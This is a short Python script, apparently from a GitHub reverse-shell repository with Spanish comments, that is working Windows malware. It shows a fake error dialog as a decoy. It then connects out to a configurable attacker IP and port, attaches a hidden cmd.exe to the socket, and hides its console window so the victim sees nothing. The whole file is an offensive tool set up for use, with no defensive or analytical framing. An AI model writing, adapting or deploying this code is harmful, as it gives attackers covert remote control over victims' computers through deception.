
## https://github.com/bl4ck44/reverse-shell/tree/master/Scripts
import os, socket, subprocess, threading
from ctypes import windll

## Variables a modificar
mensaje = "¡Cuidado, ha ocurrido un error inesperado!\nCierre y vuelva a intentarlo más tarde"
titulo = "¡Alerta!"
IP = "10.0.2.5"
PORT = 1234 #PUERTO

def hide_console_window(): ## Oculta la ventana
    window = windll.user32.GetForegroundWindow()
    windll.user32.ShowWindow(window, 0)

def s2p(s, p): ## Threat y pipes
    while True:
        data = s.recv(1024)
        if len(data) > 0:
            p.stdin.write(data)
            p.stdin.flush()

def p2s(s, p): ## Pipe
    while True:
        s.send(p.stdout.read(1))

if __name__ == '__main__':
    ## Ventana de alerta
    windll.user32.MessageBoxW(0,mensaje, titulo, 0)
    ## Inicio de la shell
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, PORT))

    p = subprocess.Popen(["cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

    s2p_thread = threading.Thread(target=s2p, args=[s, p])
    s2p_thread.daemon = True
    s2p_thread.start()

    p2s_thread = threading.Thread(target=p2s, args=[s, p])
    p2s_thread.daemon = True
    p2s_thread.start()

    hide_console_window()  # Llamamos a la función para ocultar la ventana de la consola
    p.wait()

    s.close()
    exit(0)
